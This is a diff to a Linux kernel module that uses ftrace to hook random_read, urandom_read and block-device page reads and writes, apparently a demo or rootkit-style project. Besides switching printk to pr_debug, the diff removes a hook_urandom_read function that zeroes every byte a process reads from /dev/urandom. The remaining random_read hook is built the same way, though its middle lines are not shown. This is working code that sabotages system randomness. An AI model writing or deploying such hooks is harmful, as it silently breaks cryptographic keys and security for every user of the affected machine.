@@ -275,14 +275,14 @@ static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, 
     char *kbuf = NULL;
 
     bytes_read = orig_random_read(file, buf, nbytes, ppos);
-    printk(KERN_DEBUG "random_read: read from to /dev/random: %d bytes\n", bytes_read);
+    pr_debug("random_read: read from /dev/random: %d bytes\n", bytes_read);
 
     kbuf = kzalloc(bytes_read, GFP_KERNEL);
     error = copy_from_user(kbuf, buf, bytes_read);
 
     if(error)
     {
-         printk(KERN_DEBUG "random_read: %ld bytes could not be copied into kbuf\n", error);
+        pr_debug("random_read: %ld bytes could not be copied into kbuf\n", error);
         kfree(kbuf);
         return bytes_read;
     }
@@ -292,39 +292,7 @@ static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, 
 
     error = copy_to_user(buf, kbuf, bytes_read);
     if (error)
-         printk(KERN_DEBUG "random_read: %ld bytes could not be copied into buf\n", error);
-
-    kfree(kbuf);
-    return bytes_read;
-}
-
-static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-
-static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
-{
-    int bytes_read, i;
-    long error;
-    char *kbuf = NULL;
-
-    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
-     printk(KERN_DEBUG "urandom_read: read from /dev/urandom %d bytes", bytes_read);
-
-    kbuf = kzalloc(bytes_read, GFP_KERNEL);
-    error = copy_from_user(kbuf, buf, bytes_read);
-
-    if(error)
-    {
-         printk(KERN_DEBUG "urandom_read: %ld bytes could not be copied into kbuf\n", error);
-        kfree(kbuf);
-        return bytes_read;
-    }
-
-    for ( i = 0 ; i < bytes_read ; i++ )
-        kbuf[i] = 0x00;
-
-    error = copy_to_user(buf, kbuf, bytes_read);
-    if (error)
-         printk(KERN_DEBUG "urandom_read: %ld bytes could not be copied into buf\n", error);
+         pr_debug("random_read: %ld bytes could not be copied into buf\n", error);
 
     kfree(kbuf);
     return bytes_read;
@@ -350,7 +318,6 @@ static struct ftrace_hook demo_hooks[] = {
     HOOK("bdev_read_page", hook_bdev_read_page, &orig_bdev_read_page),
     HOOK("bdev_write_page", hook_bdev_write_page, &orig_bdev_write_page),
     HOOK("random_read", hook_random_read, &orig_random_read),
-    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
 };
 
 
